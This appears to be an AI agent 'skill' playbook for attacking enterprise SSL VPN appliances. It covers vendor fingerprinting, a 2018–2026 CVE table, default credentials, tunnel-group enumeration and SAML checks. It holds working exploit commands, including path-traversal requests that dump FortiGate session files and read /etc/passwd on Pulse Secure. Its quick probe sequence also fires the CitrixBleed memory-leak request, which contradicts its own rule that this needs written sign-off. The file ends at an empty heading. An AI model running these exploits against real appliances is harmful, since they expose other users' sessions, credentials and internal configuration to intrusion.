---
name: enterprise-vpn-attack
description: External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs.
metadata:
  sources: authorized-engagement, public-advisories, cisa-kev, citrix-security-bulletins, f5-security-advisories, nvd, watchtowr-labs, horizon3
  report_count: 1
---

## When to use this skill

Trigger when recon surfaces:
- `*.<client>.example/+CSCOE+/logon.html` or similar `+CSCOE+` paths → Cisco ASA / AnyConnect
- `intranet.*` / `vpn.*` / `connect.*` / `webvpn.*` / `wc.*` / `remote.*` subdomains
- Port 443 returning login pages with `Server: Apache` or banner like "AnyConnect", "FortiGate", "NetScaler", "GlobalProtect", "Pulse", "Ivanti"
- TCP 8443 / 4443 / 10443 / 8888 (common VPN web-mgmt ports)
- HTTP responses with `Set-Cookie: webvpn=` (Cisco) / `SVPNCOOKIE=` (Fortinet) / `NSC_AAA=` (Citrix) / `DSAuthSession=` (Pulse) / `BIGipServer*` (F5)

DO NOT use for:
- Internal lateral-movement post-foothold (out of scope per user's boundary)
- VPN client-side bugs (different attack class)
- IPsec / IKE / L2TP / PPTP / OpenVPN / WireGuard (different protocols, not SSL VPN web stack) — owned by `infra-vpn-ike`

---

## Vendor identification (fingerprinting)

### Cisco ASA / AnyConnect
```bash
curl -skI 'https://target/+CSCOE+/logon.html' | head -10
# Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content
# Login page contains: "AnyConnect", "CSCOE", "logon.html"
```
ASA version: not banner-disclosed in modern builds; need to derive from JS file paths or test specific paths.

```bash
# Path-based version hints (older builds leaked builds in URLs)
curl -sk 'https://target/+CSCOE+/sdesktop/scan-finalize?path=test'
curl -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled
curl -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint
```

### Fortinet FortiGate / FortiOS
```bash
curl -skI 'https://target/remote/login' | head -10
# Look for: Set-Cookie: SVPNCOOKIE=, Server header missing or "xxxxxxxx-xxxxx"
# Login page contains: "FortiGate", "Fortinet", "SSL-VPN"
```
Version: `/remote/info` sometimes leaks (older), or `/login?username=` 302 response

### Citrix NetScaler / ADC / Gateway
```bash
curl -skI 'https://target/' | head -10
# Look for: Set-Cookie: NSC_AAA=, Set-Cookie: NSC_USER=, Server: NetScaler
# Login page contains: "NetScaler", "Citrix Gateway"

# Version banner
curl -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'
curl -sk 'https://target/menu/neo'                # 200 if vulnerable to CVE-2019-19781 era
```

### Palo Alto GlobalProtect
```bash
curl -skI 'https://target/global-protect/login.esp' | head -10
# Look for: Set-Cookie: PHPSESSID= (yes, GP uses PHP), Server: Apache (PA-VM internal)
# Page contains: "GlobalProtect Portal", "PAN-OS"

# Version banner via login page
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'GlobalProtect Portal[\s\S]{0,200}'
# Or check meta tag
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'
```

### Pulse Secure / Ivanti Connect Secure
```bash
curl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10
# Look for: Set-Cookie: DSAuthSession=, DSPREAUTH=
# Page contains: "Pulse Secure" or "Ivanti Connect Secure"

# Version
curl -sk 'https://target/dana-na/auth/url_default/welcome.cgi' | grep -oE 'Pulse Connect Secure[^<]*|ivanti[^<]*[0-9.]+'
```

### SonicWall NetExtender / SMA
```bash
curl -skI 'https://target/cgi-bin/welcome' | head -10
# Look for: Set-Cookie: swap=, swapauth=
# Page contains: "SonicWall", "NetExtender", "SMA"
```

### F5 Big-IP / APM
```bash
curl -skI 'https://target/my.policy' | head -10
# Look for: Set-Cookie: BIGipServer*, MRHSession=
# Server: BIG-IP (sometimes)
```

---

## CVE matrix — pre-auth or auth-bypass (2018-2026)

### Cisco ASA / AnyConnect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-0296** | ASA pre-9.x specific builds | Path traversal — info disclosure (sessions, config) | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
| **CVE-2020-3452** | ASA, FTD before specific patch levels | Path traversal — file read | `GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua` and variations |
| **CVE-2023-20269** | ASA, FTD specific | Auth bypass on SSL VPN | Brute-force a group + valid creds combo against `/+webvpn+/index.html` |
| **CVE-2024-20481** | RAVPN | DoS via crafted handshake | **SKIP in red team — disruptive** |
| **CVE-2025-20333** + **CVE-2025-20362** (ArcaneDoor follow-on, Sep 2025) | ASA/FTD with SSL VPN web services. First fixed (covers both): ASA 9.12.4.72, 9.14.4.28, 9.16.4.85, 9.18.4.67, 9.20.4.10, 9.22.2.14, 9.23.1.19; FTD 7.0.8.1, 7.2.10.2, 7.4.2.4, 7.6.2.1, 7.7.10.1 | 20362 unauth access to restricted VPN web-server URLs + 20333 authenticated root RCE (9.9) = pre-auth root chain; CISA ED 25-03, KEV 2025-09-25 ([Horizon3](https://horizon3.ai/attack-research/vulnerabilities/cve-2025-20362-cve-2025-20333-cve-2025-20363/)) | Version match only — **SKIP in red team**; a Nov 2025 variant reloads unpatched devices |
| **CVE-2026-20349** | ASA/FTD Remote Access SSL VPN (fixed builds: verify in cisco-sa-asaftd-vpn-dos-dzv4mQFF) | Unauth crafted HTTP → device reload; KEV 2026-08-11 | **SKIP in red team — disruptive** |

```bash
# Cisco CVE-2020-3452 — file read
curl -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5

# Cisco CVE-2018-0296 — path traversal
curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20

# Files commonly retrievable on vulnerable ASA:
# /+CSCOE+/portal_inc.lua    (portal inclusions — may reveal local users)
# /+CSCOE+/session_password.html
# /+CSCOE+/files/files.html
```

### Fortinet FortiGate / FortiOS

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-13379** | FortiOS 5.4-6.0 | Path traversal — sslvpn_websession file read | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow — pre-auth RCE | Complex exploit; test with `nuclei` template `CVE-2022-42475` |
| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow — pre-auth RCE | Public PoCs exist; nuclei template available |
| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write — pre-auth RCE | Public PoC; nuclei template `CVE-2024-21762` |
| **CVE-2024-55591** | FortiOS 7.0-7.4 | Auth bypass on FortiOS Node.js websocket admin interface | `GET /endpoint` on admin-interface port |
| **CVE-2025-24472** | FortiOS 7.0.0-7.0.16 (fixed 7.0.17); FortiProxy 7.0 < 7.0.20, 7.2 < 7.2.13 | Super-admin via CSF proxy requests; needs Security Fabric enabled and upstream/downstream serial numbers (FG-IR-24-535); KEV 2025-03-18, ransomware use | Version + Fabric-enabled match only |
| **CVE-2025-59718** | FortiOS 7.0 < 7.0.18, 7.2 < 7.2.12, 7.4 < 7.4.9, 7.6 < 7.6.4 (also FortiProxy, FortiSwitchManager) | FortiCloud SSO admin-login bypass via crafted SAML response (FG-IR-25-647); KEV 2025-12-16 | Version match + is FortiCloud SSO login offered on the admin UI? |
| **CVE-2026-24858** | FortiOS 7.0 ≤ 7.0.18, 7.2 ≤ 7.2.12 (fix: verify), 7.4 < 7.4.11, 7.6 < 7.6.6; also FortiProxy/FortiManager/FortiAnalyzer/FortiWeb | Any FortiCloud account with a registered device can log into other customers' devices that have FortiCloud SSO enabled (FG-IR-26-060); KEV 2026-01-27 | Version match only — never use your own FortiCloud account against the target |

```bash
# Fortinet CVE-2018-13379 — most reliably-fingerprintable file read
curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
# Response contains plaintext usernames + sessions if vulnerable

# Fortinet credential dump format (from CVE-2018-13379 dumps that hit pastebin in 2021):
# IP:PORT     username     password     (and others)
```

### Citrix NetScaler / ADC / Gateway

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-19781** (Shitrix) | ADC/Gateway 10.5-13.0 specific | Path traversal → RCE via XML upload | `GET /vpn/../vpns/cfg/smb.conf` |
| **CVE-2022-27518** | ADC/Gateway with SAML configured | Pre-auth RCE | Complex; test with nuclei |
| **CVE-2023-3519** | NetScaler ADC/Gateway 13.0-13.1 specific | Pre-auth RCE via crafted HTTP | Public PoCs exist |
| **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | `POST /oauth/idp/.well-known/openid-configuration` with crafted Host header — long Host header triggers memory leak in response |
| **CVE-2025-5349** | 14.1 < 14.1-43.56; 13.1 < 13.1-58.32; 13.1-FIPS/NDcPP < 13.1-37.235; 12.1-FIPS < 12.1-55.328 | Improper access control on the NetScaler management interface — needs reach to NSIP / cluster-mgmt IP / local GSLB site IP | Stage A — is the NSIP answering from outside at all? |
| **CVE-2025-5777** (CitrixBleed 2) | same builds as CVE-2025-5349; needs Gateway (VPN vserver, ICA Proxy, CVPN, RDP Proxy) or AAA vserver | Insufficient input validation → memory overread; live session tokens land in the leaked bytes | Stage A = control request only; Stage B = the diff. See block below |
| **CVE-2025-6543** | 14.1 < 14.1-47.46; 13.1 < 13.1-59.19; 13.1-FIPS/NDcPP < 13.1-37.236 (12.1-FIPS not affected); same Gateway/AAA precondition | Memory overflow → unintended control flow + DoS; in CISA KEV, exploited in the wild | Version match only — **SKIP in red team, the only proof is a crash** |
| **CVE-2025-7775** | 14.1 < 14.1-47.48; 13.1 < 13.1-59.22; 13.1-FIPS/NDcPP < 13.1-37.241; 12.1-FIPS/NDcPP < 12.1-55.330 | Memory overflow → pre-auth RCE and/or DoS; in CISA KEV, exploited in the wild | Version match only — **SKIP in red team, the RCE path is the crash path** |
| **CVE-2025-7776** | same builds as CVE-2025-7775; needs a Gateway with a PCoIP profile bound to it | Memory overflow → erroneous behaviour + DoS | **SKIP in red team — disruptive** |
| **CVE-2025-8424** | same builds as CVE-2025-7775 | Improper access control on the management interface — needs NSIP / cluster-mgmt IP / GSLB site IP / SNIP with mgmt access | Stage A — same NSIP-exposure check as CVE-2025-5349 |

Branches 12.1 and 13.0 are End Of Life: Citrix declares them vulnerable and ships no fix, so an EOL build is a finding on the version string alone. Ranges above are the vendor's own, from bulletins CTX693420 (5349/5777), CTX694788 (6543) and CTX694938 (7775/7776/8424).

```bash
# Citrix Bleed (CVE-2023-4966).
# Stage A — version match only. The build string decides this CVE on its own; the
# vendor ranges are above. There is no memory-safe differential: the only signal
# this bug produces IS other users' memory, so detection stops at the version.
curl -sk -X POST "https://target/oauth/idp/.well-known/openid-configuration" \
  -H 'Host: target' -o /dev/null -w 'baseline body: %{size_download} bytes\n'
# A normal Host header. Record the baseline size so a later authorized Stage B
# request has something to diff against. This request leaks nothing.
```

**Stage B — requires explicit written sign-off naming this CVE.** The long-Host
request returns up to ~24 KB of the appliance's memory, and in the wild that
memory routinely carries **other users' live NSC_AAAC session tokens**. Capturing
one is unauthorized access to that person's account, not a scanner finding.

- **One request. Never loop**, and never iterate to "get a better sample": each
  repeat is a fresh grab of a different user's data.
- Write the response to a file handled under `evidence-hygiene`, not to the terminal.
- **Do not authenticate with anything you find.** The finding is complete at "the
  response contains session material that is not mine": record the token count and
  type, redact the values, report immediately. A leaked live token is an active
  incident for the target, not a detail for the write-up.
- Patching does not kill already-stolen sessions, which is why this CVE kept being
  exploited after fixes shipped. Citrix's guidance is `kill icaconnection -all`,
  `kill pcoipConnection -all`, `kill aaa session -all` and
  `clear lb persistentSessions` after upgrading.

```bash
# CVE-2019-19781 file read. Stage A: smb.conf is a config file, not user data,
# and the read is non-destructive — but it is still an unauthenticated file read
# off a production appliance, so it belongs in an authorized window.
curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
```

```bash
# CitrixBleed 2 (CVE-2025-5777). The vendor confirms only "insufficient input validation
# leading to memory overread"; the endpoint below is researcher-derived (watchTowr Labs,
# Horizon3.ai), so treat the mechanism as vendor-confirmed and the probe as third-party.

# Stage A — DETECTION ONLY. Leaks nothing: the `=` is present, so the value parses normally.
curl -sk -X POST 'https://target/p/u/doAuthentication.do' \
  -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'login=' -o /tmp/cb2_base.xml
grep -o '<InitialValue>.*</InitialValue>' /tmp/cb2_base.xml
# With the `=` present InitialValue comes back empty. That is your baseline, and the
# endpoint answering + a Gateway/AAA vserver + an affected build is already reportable.

# Stage B — REQUIRES EXPLICIT WRITTEN SIGN-OFF. Drops the `=` so the value is never parsed.
# Blast radius: ~127 bytes of appliance stack per request, belonging to other users, and
# known to contain live session tokens. Handle as client credential material — do not
# replay it, do not store it outside the engagement vault, report the fact not the bytes.
# Bound: ONE request. Do not loop, do not poll, do not script it.
curl -sk -X POST 'https://target/p/u/doAuthentication.do' \
  -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'login' -o /tmp/cb2_test.xml
diff /tmp/cb2_base.xml /tmp/cb2_test.xml
# Vulnerable = InitialValue in the test response carries stack bytes the baseline did not.
# The researchers' own wording on the patched case is inconsistent, so one request is
# INCONCLUSIVE by itself — pair the diff with the build number before calling it.

# Remediation check: patching does not invalidate tokens already stolen. CTX693420 tells
# the admin to run `kill icaconnection -all` and `kill pcoipConnection -all` once every
# node in the HA pair / cluster is upgraded. Verify that in the re-test, not just the build.
```

### Palo Alto GlobalProtect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2024-3400** | PAN-OS 10.2-11.1 with GP enabled | Command injection — pre-auth RCE | `POST /ssl-vpn/login.esp` with crafted Cookie header containing `SESSID=../../../var/log/pan/test.txt` |
| **CVE-2024-0012** + **CVE-2024-9474** | PAN-OS 10.2 < 10.2.12-h2, 11.0 < 11.0.6-h1, 11.1 < 11.1.5-h1, 11.2 < 11.2.4-h1 (9474 also 10.1 < 10.1.14-h6; older hotfix trains listed in the advisories) | Management web interface auth bypass → admin, chained with admin → root privilege escalation; KEV 2024-11-18, ransomware use | Stage A — is the management interface reachable from outside? Version match only |
| **CVE-2025-0108** | PAN-OS 10.1 < 10.1.14-h9, 10.2 < 10.2.13-h3, 11.1 < 11.1.6-h1, 11.2 < 11.2.4-h4 (older hotfix trains listed in the advisory) | Management web interface auth bypass that invokes PHP scripts (no RCE on its own); KEV 2025-02-18 | Same management-exposure check; version match only |
| **CVE-2026-0257** | PAN-OS 10.2 / 11.1 / 11.2 / 12.1 with GlobalProtect portal or gateway (fixed builds: verify in the advisory) | GlobalProtect auth bypass → unauthorized VPN connection; KEV 2026-05-29, ransomware use | Version match only |
| **CVE-2026-0300** | PAN-OS 10.2 < 10.2.18-h6, 11.1 < 11.1.15, 11.2 < 11.2.12, 12.1 < 12.1.7 (PA-/VM-Series) | Pre-auth buffer overflow in the User-ID Authentication Portal (Captive Portal) → root RCE; KEV 2026-05-06 | Version + portal exposure only — **SKIP in red team, crash risk** |

CVE-2024-0012, CVE-2024-9474 and CVE-2025-0108 live on the **management web interface**, not the GlobalProtect portal. A GP-only exposure is not affected; a management interface answering from the internet is a finding on its own. Fixed versions above come from Palo Alto's advisory JSON (`security.paloaltonetworks.com/json/<CVE>`).

```bash
# CVE-2024-3400.
# Stage A — version and feature match only. PAN-OS 10.2 / 11.0 / 11.1 with both
# GlobalProtect gateway (or portal) AND device telemetry enabled. The version
# plus that feature pair decides it; nothing below executes anything.
curl -sk 'https://target/global-protect/login.esp' -o /dev/null \
  -w 'GP portal present: HTTP %{http_code}\n'
# Then take the build from the vendor-facing banner or from the client's own
# inventory. Do not try to infer the patch level from behaviour.
```

**Stage B — requires explicit written sign-off naming this CVE.** The published
proof for this bug is **command injection**: the `SESSID` cookie value becomes a
filename, so a shell metacharacter in it runs as root on the firewall and leaves
a file behind on the appliance's filesystem.

Previously this block shipped a `$(id)` payload under the heading "detection".
That is remote command execution on a perimeter firewall, and it also writes to
`/var/log/pan/`, which is a persistent change to the device. It is not detection
and must never be run as a discovery step.

- Take the exact request from Palo Alto's advisory for CVE-2024-3400 at
  exploitation time. Do not reconstruct it from memory, and do not reuse a
  payload from a blog without reading what it writes.
- Benign marker only: a sleep or an `id`-equivalent whose output you diff against
  a saved baseline. **No shell, no write outside the path the PoC already
  touches, no persistence.**
- You must record every file the proof creates and hand that list to the target,
  because the artefact is indistinguishable from a real intrusion in their logs.
- A confirmed-RCE claim needs a unique canary echoed back plus a diff against a
  baseline captured before the request (see `vmware-vcenter-attack` Step 4).
- This CVE is in CISA KEV and was mass-exploited. Assume the target's SOC is
  watching this exact endpoint and notify your point of contact **before** the
  request, not after.

### Pulse Secure / Ivanti Connect Secure / Policy Secure

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-11510** | Pulse Connect Secure 8.x-9.x | Arbitrary file read | `GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/` |
| **CVE-2021-22893** | Pulse Connect Secure 9.x | Pre-auth RCE | Complex multi-step; test with nuclei |
| **CVE-2024-21887** | Ivanti Connect Secure 9.1-22.6 | Command injection on web component | `POST /api/v1/totp/user-backup-code/` with crafted body |
| **CVE-2023-46805** | Ivanti Connect Secure 9.1-22.6 | Auth bypass | Combined with 21887 for full chain |
| **CVE-2025-0282** | Connect Secure < 22.7R2.5; Policy Secure < 22.7R1.2; Neurons for ZTA gateways < 22.7R2.3 | Pre-auth stack overflow → RCE; KEV 2025-01-08, ransomware use | Version match only — **SKIP in red team, crash risk** |
| **CVE-2025-22457** | Connect Secure < 22.7R2.6; Policy Secure < 22.7R1.4; ZTA Gateways < 22.8R2.2 | Pre-auth stack overflow → RCE; KEV 2025-04-04, ransomware use | Version match only — **SKIP in red team, crash risk** |

```bash
# CVE-2019-11510 — Pulse file read
curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'
```

### SonicWall

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection — pre-auth | nuclei template available |
| **CVE-2024-40766** | SonicOS specific | Access-control flaw | Specific firmware versions |
| **CVE-2024-53704** | SonicOS 7.1.1-7040 to 7.1.1-7058, 7.1.2-7019, 8.0.0-8035; fixed 7.1.3-7015 (8.0.x fixed build: verify in SNWLID-2025-0003) | SSLVPN authentication bypass → hijack of active SSL VPN sessions; KEV 2025-02-18, ransomware use ([Bishop Fox](https://bishopfox.com/blog/sonicwall-cve-2024-53704-ssl-vpn-session-hijacking)) | Version match only — **SKIP in red team: the proof is taking over a real user's session** |
| **CVE-2025-23006** | SMA1000 AMC/CMC ≤ 12.4.3-02804; fixed 12.4.3-02854 (SNWLID-2025-0002) | Pre-auth deserialization → OS command exec; KEV 2025-01-24, ransomware use | Stage A — is the AMC/CMC reachable from outside? Version match only |
| **CVE-2025-32819** | SMA100 (200/210/400/410/500v) < 10.2.1.15-81sv (SNWLID-2025-0011) | Authenticated SSLVPN-user arbitrary file delete → reboot to factory defaults | **SKIP in red team — destructive** |
| **CVE-2026-15409** | SMA1000 12.4.3 / 12.5.0 builds listed in SNWLID-2026-0008 (fixed build: verify) | Pre-auth SSRF in the Work Place interface (CVSS 10.0); KEV 2026-07-14, ransomware use | Version match only |

### F5 Big-IP / APM

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2020-5902** | BIG-IP 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, 11.6.1-11.6.5.1 | TMUI (Configuration utility) path traversal → pre-auth RCE; in CISA KEV | Stage A — is the management plane answering from outside? |
| **CVE-2022-1388** | BIG-IP 16.1.x < 16.1.2.2, 15.1.x < 15.1.5.1, 14.1.x < 14.1.4.6, 13.1.x < 13.1.5, all 12.1.x (≤ 12.1.6) and 11.6.x (≤ 11.6.5); 17.0.x unaffected | iControl REST auth bypass (CWE-306) → root command exec; in CISA KEV | Stage A — `/mgmt/shared/authn/login` answering = iControl REST exposed |
| **CVE-2023-46747** | BIG-IP branches 13.1.0 / 14.1.0 / 15.1.0 / 16.1.0 / 17.1.0, fixed at 13.1.5.1 / 14.1.5.6 / 15.1.10.2 / 16.1.4.1 / 17.1.0.3 | Configuration-utility auth bypass via AJP request smuggling → root command exec; in CISA KEV | Stage A — same management-plane exposure check |
| **CVE-2023-46748** | same branches and fixed builds as CVE-2023-46747 | Authenticated SQL injection in the Configuration utility → command exec | Needs a session — it is the second half of the 46747 chain, never a standalone finding |
| **CVE-2025-53521** | BIG-IP APM 15.1.0 < 15.1.10.8, 16.1.0 < 16.1.6.1, 17.1.0 < 17.1.3, 17.5.0 < 17.5.1.3, with an APM access policy on a virtual server | Stack-based overflow (CWE-121) → pre-auth RCE; in CISA KEV since 2026-03-27 | Version match only — **SKIP in red team, crash risk on a live VPN** |

Note which plane each one lives on. CVE-2020-5902, CVE-2022-1388, CVE-2023-46747 and
CVE-2023-46748 all need the management plane — the management port or a self IP — to be
reachable, so a BIG-IP with its Configuration utility properly firewalled is not exposed to
them. CVE-2025-53521 is different: it is reachable through the APM virtual server that
serves `/my.policy`, which is exactly the surface this skill is pointed at. An unpatched APM
is therefore a far bigger finding than an unpatched Configuration utility behind a firewall.

```bash
# F5 Stage A — detection only. No traversal, no auth attempt, no credentials sent.
curl -skI 'https://target/my.policy' | head -5     # APM policy present = CVE-2025-53521 precondition
curl -sk -o /dev/null -w '%{http_code}\n' 'https://target/mgmt/shared/authn/login'
# Anything other than a connection failure means iControl REST — the management plane — is
# reachable from outside. Report that on its own merits: CERT/CC VU#290915 (the CVE-2020-5902
# note) states plainly that TMUI must be blocked from untrusted networks.
# DO NOT POST to that URI: it is the documented token-login endpoint, and a POST with a
# username is a login attempt against the appliance's admin account.

# Stage B — REQUIRES EXPLICIT WRITTEN SIGN-OFF, and deliberately not reproduced here.
# Every working proof for CVE-2020-5902, CVE-2022-1388 and CVE-2023-46747 either reads a
# file off the appliance or runs a command as root — there is no detection-only variant.
# Blast radius: root on the box terminating the client's VPN, plus the LDAP bind and RADIUS
# shared secret in its config. Take the exact request from the vendor advisory at
# exploitation time, so you are working from the patched-state reference, not from this file.
```

### F5 `BIGipServer` cookie — internal topology for free

The `Set-Cookie: BIGipServer<pool>` value from the fingerprinting step is not a session id.
With cookie persistence (`HTTP Cookie Insert` / `Cookie Rewrite`) the BIG-IP encodes the
chosen pool member's real address and port into it. No CVE, no exploit, no unusual request —
one normal page load discloses a node of the internal network.

| Cookie value shape | Backend | Decode |
|---|---|---|
| `1677787402.36895.0000` | IPv4 pool member | Both fields are little-endian. `1677787402` → `0x6401010A` → reverse bytes → `10.1.1.100`. `36895` → `0x901F` → reverse → `0x1F90` → `8080`. The trailing `0000` is a reserved placeholder, always zeroes. |
| `vi20010112000000000000000000000030.20480` | IPv6 pool member | `vi` + the full 32-hex IPv6 address (`2001:112::30`), then the same byte-swapped port (`20480` → `0x5000` → `0x0050` → `80`). |
| `rd5o00000000000000000000ffffc0000201o80` | pool member in a non-default route domain | `rd<id>o<32-hex address>o<port>`. Address is plain hex, IPv4 shows up `::ffff:`-mapped (`c0000201` = `192.0.2.1`), route domain `5`. The port here is **plain decimal**, not byte-swapped. |
| matches none of the three | encrypted | `encrypt-cookies` is set on the HTTP profile. Not decodable without the profile passphrase — record it as a positive hardening finding, the same way you record a stripped banner. |

```bash
# Decode the IPv4 form offline — no traffic to the target at all.
python3 -c 'import sys,ipaddress;a,p,_=sys.argv[1].split(".");print(ipaddress.IPv4Address(int(a).to_bytes(4,"little")), int.from_bytes(int(p).to_bytes(2,"little"),"big"))' \
  1677787402.36895.0000
# -> 10.1.1.100 8080
```

Each distinct cookie you collect across hostnames and paths is one more backend node, so a
handful of normal browsing requests maps the internal addressing plan, the ports services
actually listen on, and the member count per pool. Report it as information disclosure with
the decoded set attached; the fix is the vendor's own, an HTTP profile with
`encrypt-cookies add { <cookie_name> }` plus an `encrypt-cookie-secret` passphrase.

---

## SAML SP / IdP misconfigurations (always check)

Most enterprise VPNs now use SAML for SSO. Check SP metadata:

```bash
# Cisco ASA
curl -sk 'https://target/+CSCOE+/saml/sp/metadata' | head -50

# Fortinet
curl -sk 'https://target/remote/saml/metadata' | head -50

# Citrix
curl -sk 'https://target/saml/login' | head -30
```

Look for:
- `AuthnRequestsSigned="false"` → see `hunt-saml` for XSW exploitation
- `WantAssertionsSigned="false"` → severe; assertion-replay possible
- Audience-restriction validation gaps
- Public SP signing cert (for replay/forging attacks)

---

## Default credentials (test sparingly — lockout risk)

| Vendor | User | Password | Notes |
|---|---|---|---|
| Cisco ASA | admin | cisco | Default factory; rarely seen in prod |
| Cisco ASA | enable_15 | cisco | Console |
| Fortinet | admin | (empty) | Factory default |
| Citrix NetScaler | nsroot | nsroot | Factory default |
| Citrix NetScaler | nsroot | (serial number) | Newer firmware |
| Palo Alto | admin | admin | Factory default |
| Pulse Secure | admin | password | Factory; CIS-hardened changes this |
| F5 Big-IP | root | default | Factory |
| F5 Big-IP | admin | admin | Common alternate |
| SonicWall | admin | password | Factory |

⚠ Most enterprise targets have changed these. Test ≤2 attempts per account to avoid lockout.

---

## Group / tunnel-group enumeration (Cisco-specific)

Cisco ASA AAA groups can sometimes be enumerated without auth.

```bash
# Tunnel group enumeration via timing
for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vendors Partners Sales Marketing IT; do
  ms=$(curl -sk --max-time 10 -o /dev/null -w "%{time_total}" \
    -X POST "https://target/+webvpn+/index.html" \
    -d "username=test&password=test&group_list=$group&tgroup=&Login=Login")
  echo "$group: ${ms}s"
done
# Larger differential timing = group exists; valid groups respond slower in some builds
```

---

## AAA backend identification

After auth fails, look at error response details:

| Pattern in response | AAA backend |
|---|---|
| `a0=2` (Cisco) | Unknown user |
| `a0=3` (Cisco) | Wrong password |
| `a0=4` (Cisco) | Login restricted |
| `a0=12` (Cisco) | Account locked |
| `a0=115` (Cisco) | Generic auth fail (LDAP/RADIUS/AD layer error) |
| AADSTS in response body | Backed by Entra (SAML) |
| `Authentication failed via RADIUS` | RADIUS backend |
| `Invalid username or password` (generic) | LDAP or local DB |

If you see SAML/Entra in the flow, pivot to `m365-entra-attack` skill for cred-spray strategy.

---

## Common probe sequence (5-minute fingerprint)

```bash
TARGET="vpn.target.example"

# Cisco
curl -skI "https://$TARGET/+CSCOE+/logon.html" 2>&1 | head -3
curl -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml; ls -la /tmp/cisco_saml.xml
curl -sk --path-as-is "https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest" -o /tmp/cisco_cve.html

# Fortinet
curl -skI "https://$TARGET/remote/login" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -o /tmp/forti_cve.txt; head -c 200 /tmp/forti_cve.txt

# Citrix
curl -skI "https://$TARGET/" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf" -o /tmp/citrix_cve.txt; head -c 200 /tmp/citrix_cve.txt
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://$TARGET/oauth/idp/.well-known/openid-configuration" -o /tmp/citrix_bleed.txt
wc -c /tmp/citrix_bleed.txt

# Palo Alto
curl -skI "https://$TARGET/global-protect/login.esp" 2>&1 | head -3

# Pulse / Ivanti
curl -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt
```

---

## Nuclei templates for fast triage

Nuclei has high-quality templates for most of the above CVEs. Single command sweeps:

```bash
nuclei -u https://target/ \
  -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \
  -severity high,critical -rl 5
```

Add `-as` (auto-scan) for broader vuln coverage but slower.

---

## Operational discipline

- **Banner-stripped servers (no version disclosure)** are good defense-in-depth — record as positive finding even if no CVE found
- **Rate-limit yourself** — these appliances often log every request to a SIEM. Patient pace, jittered timing.
- **SAML metadata is anonymous** — pull it. It's intel about AAA backend.
- **Don't run pre-auth-RCE PoCs in red team without explicit OK** — accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.
- **Document the AAA backend identification** — knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths.

---

## Bridge to neighboring skills

- `m365-entra-attack` — when AAA backend is Entra SAML; cred-spray strategy carries over
- `hunt-saml` — XSW / signature-stripping if SAML SP is misconfigured
- `mid-engagement-ir-detection` — appliances generate noisy logs; watch for IPS rules being deployed mid-engagement
- `redteam-mindset` — banner-stripped ≠ "not vulnerable"; keep digging via behavioral fingerprints

---

## Anti-patterns

